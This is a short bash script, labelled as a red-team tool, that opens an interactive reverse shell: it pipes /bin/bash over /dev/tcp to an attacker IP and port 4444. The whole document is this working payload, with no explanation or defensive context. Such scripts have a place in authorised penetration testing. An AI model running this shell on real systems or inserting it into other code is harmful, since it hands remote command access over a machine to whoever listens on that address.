#!/bin/bash

# Red Team - Netcat Reverse Shell
ATTACKER_IP="192.168.1.100"
PORT="4444"

echo "[+] Setting up reverse shell..."
/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1